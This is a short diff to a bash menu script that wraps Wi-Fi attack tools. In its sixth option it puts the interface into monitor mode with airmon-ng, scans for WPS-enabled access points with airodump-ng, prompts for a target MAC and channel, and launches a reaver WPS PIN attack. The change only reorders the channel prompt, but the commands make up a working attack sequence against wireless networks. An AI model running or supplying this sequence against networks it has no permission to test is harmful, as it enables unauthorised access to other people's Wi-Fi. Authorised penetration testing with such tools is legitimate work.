@@ -246,17 +246,17 @@ if [ $ask -eq 5 ]
 fi
 if [ $ask -eq 6 ]
 	then
-		echo "Choose Channel:"
-		read chan
 		echo "Please wait.. monitor mode is being enabled.."
 		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
-		sudo airmon-ng start $inter $chan > /dev/null
+		sudo airmon-ng start $inter > /dev/null
 		echo "How long should be searched for WPS? [sec]:"
 		read secs
 		echo "scanning networks for WPS availability.."
 		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $monitor --wps
 		echo "MAC of Access-Point:"
 		read macacc
+		echo "Choose Channel: "
+		read chan
 		echo "loading attack..."
 		tput setaf 1
 		sudo reaver -i $monitor -c $chan -b $macacc -k 1
